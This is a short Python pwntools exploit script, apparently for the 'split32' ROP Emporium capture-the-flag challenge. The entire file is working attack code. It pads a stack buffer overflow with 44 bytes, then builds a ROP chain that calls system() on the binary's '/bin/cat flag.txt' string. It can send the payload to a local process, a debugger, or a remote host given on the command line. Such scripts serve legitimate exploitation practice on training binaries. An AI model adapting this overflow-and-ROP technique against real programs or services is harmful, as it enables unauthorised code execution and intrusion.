from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)


exe = './split32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
context.delete_corefiles = True

padding = 44

rop = ROP(elf)

flag_location = next(elf.search(b"/bin/cat flag.txt"))
# rop.system(flag_location)
rop.call("system", [flag_location])

print(rop.dump())

payload = b'A' * padding
payload += rop.chain()
print(payload)


io = start()
io.sendlineafter(b">", payload)
io.interactive()

